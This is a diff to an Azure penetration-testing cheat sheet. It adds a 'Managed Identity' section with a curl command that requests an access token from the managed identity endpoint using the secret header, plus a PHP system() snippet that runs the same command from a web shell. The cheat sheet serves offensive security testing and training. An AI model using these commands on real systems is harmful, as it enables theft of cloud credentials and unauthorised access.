@@ -8,6 +8,7 @@
   * [Mimikatz](#Mimikatz)
   * [Powershell History](#Powershell-History)
   * [Transcript](#Transcript)
+* [Managed Identity](#Managed-Identity)
 * [Reset password of other users](#Reset-password-of-other-users)
 * [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
 * [Deployments](#Deployments)
@@ -63,12 +64,6 @@ Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
 - Required aad-graph token
 ```
 Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
-```
-
-#### Check for managed identity
-- print environment variables and check for IDENTITY_HEADER and IDENTITY_ENDPOINT 
-```
-env
 ```
 
 ## Automation account
@@ -271,6 +266,26 @@ type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Con
 ### Transcript
 ```
 type C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
+```
+
+## Managed Identity
+#### Check for managed identity
+- print environment variables and check for IDENTITY_HEADER and IDENTITY_ENDPOINT 
+```
+env
+```
+
+#### Request access token for managed identity
+```
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+```
+
+```
+<?php 
+
+system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
+
+?>
 ```
 
 ## Reset password of other users
